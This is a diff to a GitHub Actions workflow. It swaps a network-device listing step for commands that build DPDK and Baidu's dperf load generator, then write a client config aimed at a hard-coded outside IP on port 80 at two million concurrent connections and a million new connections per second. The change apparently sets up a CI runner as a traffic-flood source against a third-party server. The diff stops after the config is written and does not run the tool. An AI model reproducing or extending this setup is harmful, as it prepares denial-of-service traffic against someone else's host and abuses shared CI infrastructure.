@@ -5,4 +5,5 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v6
-      - run: lspci | grep -i network
+      - run: sudo su
+      - run: apt-get update -y && apt-get install -y build-essential meson ninja-build pkg-config libnuma-dev python3-pyelftools libibverbs-dev rdma-core pciutils git wget tar && echo 2048 > /sys/kernel/mm/hugepages/hugepages-2048kB/nr_hugepages && wget -qO- http://fast.dpdk.org/rel/dpdk-22.11.2.tar.xz | tar -xJ && cd dpdk-stable-22.11.2 && meson setup build && cd build && ninja && ninja install && ldconfig && export PKG_CONFIG_PATH=/usr/local/lib/x86_64-linux-gnu/pkgconfig:/usr/local/lib/pkgconfig:$PKG_CONFIG_PATH && cd ../.. && git clone https://github.com/baidu/dperf.git && cd dperf && make && MEL_PCI=$(lspci -D | grep -i mellanox | head -n 1 | awk '{print $1}') && LOCAL_IP=$(hostname -I | awk '{print $1}') && echo -e "mode        client\nprotocol    http\ncpu         0 1 2 3\nport        $MEL_PCI\nclient      $LOCAL_IP 100\nserver      142.171.195.145 80\ncc          2000000\ncps         1000000" > client.conf && echo "ГОТОВО! Конфиг client.conf создан."
